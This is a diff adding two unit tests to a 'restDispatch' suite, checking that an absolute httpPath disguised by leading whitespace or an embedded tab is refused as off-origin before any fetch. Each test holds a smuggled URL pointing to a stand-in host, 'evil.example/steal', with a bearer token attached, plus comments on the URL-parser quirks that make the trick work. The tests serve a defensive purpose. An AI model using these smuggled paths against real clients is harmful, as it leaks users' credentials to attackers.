@@ -111,6 +111,31 @@ describe("restDispatch", () => {
         expect(stub).not.toHaveBeenCalled();
     });
 
+    it("refuses an absolute httpPath hidden behind leading whitespace", async () => {
+        expect.assertions(2);
+
+        const stub = stubFetch();
+
+        // WHATWG URL parsing strips leading C0-and-space, so the raw string does
+        // not look absolute to a naive check but reaches the network as
+        // `http://evil.example/steal` — with the bearer attached.
+        await expect(restDispatch({ httpPath: "  http://evil.example/steal", method: "GET" }, {}, "", "secret")).rejects.toThrow("off-origin");
+
+        expect(stub).not.toHaveBeenCalled();
+    });
+
+    it("refuses an absolute httpPath hidden behind an embedded tab", async () => {
+        expect.assertions(2);
+
+        const stub = stubFetch();
+
+        // Tab/CR/LF are removed from ANYWHERE in the input by the URL parser, so
+        // this reaches the network as `http://evil.example/steal` too.
+        await expect(restDispatch({ httpPath: "htt\tp://evil.example/steal", method: "GET" }, {}, "", "secret")).rejects.toThrow("off-origin");
+
+        expect(stub).not.toHaveBeenCalled();
+    });
+
     it("still fetches a relative httpPath when no origin was resolved", async () => {
         expect.assertions(2);
 
